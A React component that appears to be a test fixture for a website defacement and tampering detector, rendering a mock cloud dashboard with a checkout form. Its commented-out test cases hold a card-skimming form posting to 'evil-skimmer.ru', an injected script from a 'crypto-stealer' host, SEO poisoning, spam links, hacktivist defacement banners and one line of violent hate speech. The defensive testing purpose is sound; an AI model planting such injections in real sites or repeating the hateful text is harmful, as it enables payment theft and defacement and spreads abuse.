import React, { useEffect } from "react";

/**
 * 🛡️ MainContent - Professional Content Area & L1 Defacement Test Mock
 * Designed to fit seamlessly to the right of Sidebar and below Navbar.
 */
const MainContent = () => {
  // =========================================================================
  // 🔬 DYNAMIC DOM HEAD MANIPULATION (L1 & L4 META / SCRIPT TEST CASES)
  // =========================================================================
  useEffect(() => {
    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L1-TRG-05] Canonical Link SEO Poisoning
     * ------------------------------------------------------------------------ */
    /*
    const canonical = document.createElement("link");
    canonical.rel = "canonical";
    canonical.href = "https://spam-seo-hijack.org";
    canonical.id = "test-canonical";
    document.head.appendChild(canonical);
    */

    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L1-TRG-06] Robots De-indexing Sabotage
     * ------------------------------------------------------------------------ */
    /*
    const robots = document.createElement("meta");
    robots.name = "robots";
    robots.content = "noindex, nofollow";
    robots.id = "test-robots";
    document.head.appendChild(robots);
    */

    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L1-TRG-03] Malicious External JS Injection
     * ------------------------------------------------------------------------ */
    /*
    const script = document.createElement("script");
    script.src = "https://crypto-stealer.ru/app.js";
    script.async = true;
    script.id = "test-script";
    document.head.appendChild(script);
    */

    /* ------------------------------------------------------------------------
     * [UNCOMMENT TO TEST L4-ADV-02] JS Hidden Manifesto / Slogans
     * ------------------------------------------------------------------------ */
    /*
    const inlineScript = document.createElement("script");
    inlineScript.id = "test-inline-script";
    inlineScript.innerHTML = `
      // CyberShield PRO Test: Hidden JS Payload
      console.log("you have been hacked by anonymous cyber team. 0wned by legion.");
    `;
    document.head.appendChild(inlineScript);
    */

    return () => {
      const can = document.getElementById("test-canonical");
      if (can) document.head.removeChild(can);
      const rob = document.getElementById("test-robots");
      if (rob) document.head.removeChild(rob);
      const scr = document.getElementById("test-script");
      if (scr) document.head.removeChild(scr);
      const inl = document.getElementById("test-inline-script");
      if (inl) document.head.removeChild(inl);
    };
  }, []);

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans antialiased pb-24">
      {/* Sub-header Filter & Search Bar */}
      <div className="bg-slate-900/50 border-b border-slate-800 px-8 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-bold text-white tracking-tight">Enterprise Workload Dashboard</h2>
          <p className="text-xs text-slate-400">Monitoring 42 active pods across us-east-1 and eu-central-1.</p>
        </div>
        <div className="flex items-center space-x-3">
          <input 
            type="text" 
            placeholder="Search workloads..." 
            className="bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-sm text-white focus:outline-none focus:border-indigo-500 w-64 transition-colors"
          />
          <button className="px-4 py-2 rounded-xl bg-slate-800 text-slate-200 text-sm font-semibold hover:bg-slate-700 transition-colors">
            Filter
          </button>
        </div>
      </div>

      {/* =====================================================================
        * 🚨 LAYER 1 & LAYER 4 DEFACEMENT TEST SUITE (DOM BODY MOCKS)
        * ===================================================================== */}

      {/* [UNCOMMENT TO TEST L1-TRG-01] Payment Form Hijacking (Cross-Apex) */}
      {/*
      <div className="m-8 p-6 bg-red-950/80 border border-red-600 rounded-2xl max-w-4xl mx-auto">
        <h3 className="text-xl font-bold text-red-400 mb-2">⚠️ L1 Test Case 1: Cross-Apex Form Action Hijack</h3>
        <form action="https://evil-skimmer.ru/steal.php" method="POST">
          <input type="text" name="cc_num" placeholder="Card Number" className="p-2 text-black rounded mb-2 w-full" />
          <button type="submit" className="bg-red-600 text-white px-4 py-2 rounded font-bold">Submit Payment</button>
        </form>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L1-TRG-02] Payment Form HTTP Downgrade */}
      {/*
      <div className="m-8 p-6 bg-amber-950/80 border border-amber-600 rounded-2xl max-w-4xl mx-auto">
        <h3 className="text-xl font-bold text-amber-400 mb-2">⚠️ L1 Test Case 2: Insecure HTTP Scheme Downgrade</h3>
        <form action="http://apexcloud.com/checkout/process" method="POST">
          <input type="text" name="data" placeholder="Secure Info" className="p-2 text-black rounded mb-2 w-full" />
          <button type="submit" className="bg-amber-600 text-white px-4 py-2 rounded font-bold">Process Secure Order</button>
        </form>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L4-TAX-02] Hacktivist Defacement (English) */}
      {/*
      <div className="m-8 p-12 bg-black border-4 border-green-500 max-w-4xl mx-auto text-center font-mono rounded-2xl shadow-2xl shadow-green-500/20">
        <h1 className="text-5xl font-black text-green-500 animate-pulse mb-4">HACKED BY ANONYMOUS CYBER TEAM</h1>
        <p className="text-2xl text-green-400 mb-4">0wned by Legion. Your security is a joke. We are anonymous, expect us.</p>
        <p className="text-lg text-slate-400">Greetz to all cyber warriors. You have been hacked!</p>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L4-TAX-03 & 04] Multilingual Hacktivist (Hindi / Bengali) */}
      {/*
      <div className="m-8 p-8 bg-slate-900 border-2 border-red-500 max-w-4xl mx-auto rounded-2xl text-center">
        <h2 className="text-3xl font-extrabold text-red-500 mb-4">⚠️ हैक किया गया | হ্যাক করা হয়েছে</h2>
        <p className="text-xl text-slate-200 mb-2">साइट हैक कर ली गई है। आपकी सुरक्षा प्रणाली बेहद कमजोर है।</p>
        <p className="text-xl text-slate-300">আপনার নিরাপত্তা দুর্বল। আমরা আপনাকে দেখছি।</p>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L4-TRG-01] Tier-1 Manifesto Defacement Attack */}
      {/*
      <div className="m-8 p-10 bg-zinc-900 border-l-8 border-purple-600 max-w-4xl mx-auto rounded-2xl shadow-xl">
        <h2 className="text-3xl font-bold text-purple-400 mb-4">OFFICIAL SEIZURE NOTICE & MANIFESTO</h2>
        <p className="text-lg text-slate-300 leading-relaxed">
          We have taken control. This site has been seized by the cyber liberation front. 
          Message to the world: your security means nothing against our collective will. 
          Government corruption and corporate greed will no longer remain unanswered. Operation liberated is now fully active.
        </p>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L4-TAX-06] SEO Pharma / Casino Spam */}
      {/*
      <div className="m-8 p-8 bg-blue-950/80 border border-blue-500 max-w-4xl mx-auto rounded-2xl">
        <h3 className="text-xl font-bold text-blue-400 mb-3">💊 L4 Test Case: SEO Black-Hat Spam</h3>
        <p className="text-slate-300 mb-3">
          Looking for genuine medical products? Buy cheap viagra online today without prescription pills. 
          Secure fast delivery. Double your bitcoin with our premium crypto trading bot and betting bonus online casino games.
        </p>
        <div className="flex space-x-4 text-blue-300 underline">
          <a href="http://spam-casino.com">Online Casino</a>
          <a href="http://pills-store.com">Cheap Pills</a>
          <a href="http://crypto-scam.net">Double BTC</a>
          <a href="http://viagra-buy.org">Buy Now</a>
          <a href="http://betting-bonus.com">Betting Bonus</a>
        </div>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L4-TAX-07] Hate Speech / Offensive Content */}
      {/*
      <div className="m-8 p-8 bg-red-900 border border-red-500 max-w-4xl mx-auto rounded-2xl text-white font-bold">
        <h3 className="text-2xl mb-2">🛑 L4 Test Case: Hate Speech</h3>
        <p className="text-lg">Death to all infidel scum. Racial cleansing must begin immediately. Nuke the entire continent.</p>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L4-TAX-08] Bot Parking / Template Placeholder */}
      {/*
      <div className="m-8 p-8 bg-slate-800 border border-slate-600 max-w-4xl mx-auto rounded-2xl text-center">
        <h3 className="text-2xl font-bold text-amber-400 mb-2">Under Construction</h3>
        <p className="text-slate-300">Site is temporarily unavailable. Coming soon. Please check back later. Lorem ipsum dolor sit amet.</p>
      </div>
      */}

      {/* [UNCOMMENT TO TEST L4-ADV-01] Hidden Cloaked SEO Spam */}
      {/*
      <div style={{ display: "none" }} hidden>
        buy cialis cheap viagra online casino crypto double your bitcoin betting bonus without prescription
      </div>
      */}


      {/* =====================================================================
        * 🟢 LEGITIMATE BASELINE HERO & WORKLOAD CONTENT (DYNAMIC ZONE)
        * ===================================================================== */}
      <main id="main-content" className="relative p-8 overflow-hidden">
        {/* Decorative Gradients */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[400px] bg-gradient-to-tr from-indigo-600/20 via-purple-600/20 to-pink-600/10 rounded-full blur-[100px] pointer-events-none -z-10" />

        <div className="max-w-6xl mx-auto text-center py-12">
          <div className="inline-flex items-center space-x-2 px-4 py-2 rounded-full bg-slate-900/90 border border-slate-800 mb-6 shadow-inner">
            <span className="flex h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
            <span className="text-xs font-semibold text-slate-300 tracking-wider uppercase">Secure Cloud Operations</span>
          </div>

          <h1 className="text-5xl md:text-7xl font-black tracking-tight mb-6 leading-tight max-w-4xl mx-auto bg-gradient-to-b from-white via-slate-100 to-slate-400 bg-clip-text text-transparent">
            High-Performance Cloud Architecture.
          </h1>

          <p className="text-lg md:text-xl text-slate-400 max-w-2xl mx-auto mb-10 leading-relaxed font-normal">
            Automated deployment clusters powered by real-time DOM structural surveillance and multi-model semantic intelligence.
          </p>

          <div className="flex flex-col sm:flex-row items-center justify-center gap-4 mb-16">
            <button className="w-full sm:w-auto px-8 py-3.5 rounded-2xl bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 font-bold text-white shadow-xl shadow-indigo-500/25 hover:opacity-95 transition-all">
              Deploy Workload
            </button>
            <button className="w-full sm:w-auto px-8 py-3.5 rounded-2xl bg-slate-900/90 border border-slate-700/80 font-bold text-slate-200 hover:bg-slate-800/80 transition-all">
              Cluster Metrics
            </button>
          </div>

          {/* Premium Hero Image Banner */}
          <div className="relative mx-auto max-w-5xl rounded-3xl overflow-hidden border border-slate-800 shadow-2xl shadow-indigo-950/50 mb-20">
            <div className="absolute inset-0 bg-gradient-to-t from-slate-950 via-transparent to-transparent z-10" />
            <img 
              src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?q=80&w=2000&auto=format&fit=crop" 
              alt="Server Dashboard" 
              className="w-full h-[400px] object-cover object-center transform hover:scale-105 transition-transform duration-700" 
            />
            <div className="absolute bottom-8 left-8 right-8 z-20 flex flex-col sm:flex-row items-start sm:items-center justify-between text-left border-t border-slate-800/80 pt-6 backdrop-blur-md bg-slate-950/60 p-6 rounded-2xl">
              <div>
                <h4 className="text-xl font-bold text-white mb-1">Global Data Mesh</h4>
                <p className="text-slate-300 text-xs">36+ Tier-1 Edge Nodes delivering anycast load balancing.</p>
              </div>
              <div className="mt-4 sm:mt-0 flex space-x-6">
                <div className="text-center sm:text-right">
                  <span className="block text-2xl font-extrabold text-indigo-400">99.999%</span>
                  <span className="text-[10px] uppercase tracking-wider text-slate-400">Uptime SLA</span>
                </div>
                <div className="text-center sm:text-right">
                  <span className="block text-2xl font-extrabold text-emerald-400">&lt; 12ms</span>
                  <span className="text-[10px] uppercase tracking-wider text-slate-400">Avg Latency</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Legitimate Checkout Form Baseline Mock (For L1 Comparison) */}
        <div id="pricing" className="max-w-3xl mx-auto mt-16">
          <div className="p-8 rounded-3xl bg-gradient-to-b from-slate-900 to-slate-950 border border-slate-800 shadow-2xl relative overflow-hidden">
            <div className="absolute -right-20 -bottom-20 w-80 h-80 bg-indigo-600/10 rounded-full blur-[80px] pointer-events-none" />
            
            <div className="flex items-center justify-between mb-8 pb-6 border-b border-slate-800">
              <div>
                <span className="text-[10px] font-bold uppercase tracking-wider px-3 py-1 bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 rounded-full mb-2 inline-block">Enterprise Target</span>
                <h3 className="text-2xl font-black text-white">Secure Cloud Billing</h3>
              </div>
              <div className="text-right">
                <span className="text-3xl font-extrabold text-white">$499</span>
                <span className="text-slate-400 text-xs"> / mo</span>
              </div>
            </div>

            {/* Verified Form Action Baseline */}
            <form action="https://apexcloud.com/checkout/process" method="POST" className="space-y-4">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-[10px] font-semibold text-slate-400 uppercase mb-1">Company Name</label>
                  <input type="text" placeholder="Acme Corp" className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:border-indigo-500 focus:outline-none transition-colors" />
                </div>
                <div>
                  <label className="block text-[10px] font-semibold text-slate-400 uppercase mb-1">Billing Email</label>
                  <input type="email" placeholder="billing@acme.com" className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:border-indigo-500 focus:outline-none transition-colors" />
                </div>
              </div>

              <div>
                <label className="block text-[10px] font-semibold text-slate-400 uppercase mb-1">Secure Card Details</label>
                <div className="flex bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 items-center text-sm">
                  <span className="text-slate-500 mr-3 font-mono">💳</span>
                  <input type="text" placeholder="•••• •••• •••• 4242" className="w-full bg-transparent text-white focus:outline-none font-mono" />
                  <span className="text-[10px] text-slate-500 font-mono">MM/YY CVC</span>
                </div>
              </div>

              <button type="submit" className="w-full py-3.5 rounded-xl bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 font-bold text-white text-sm shadow-lg shadow-indigo-500/20 hover:opacity-95 transition-all mt-4">
                Confirm Verified Payment
              </button>
              <p className="text-center text-[10px] text-slate-500 mt-2">🔒 256-Bit TLS Encryption & Verified Baseline Action Target.</p>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="max-w-6xl mx-auto px-8 pt-16 mt-20 border-t border-slate-800 flex flex-col sm:flex-row items-center justify-between text-xs text-slate-500">
        <div className="flex items-center space-x-2 mb-4 sm:mb-0">
          <span className="font-bold text-slate-400">ApexCloud Secure Cluster</span>
          <span>•</span>
          <span>All nodes operational</span>
        </div>
        <div>© 2026 ApexCloud Technologies. Verified DOM Baseline Active.</div>
      </footer>
    </div>
  );
};

export default MainContent;
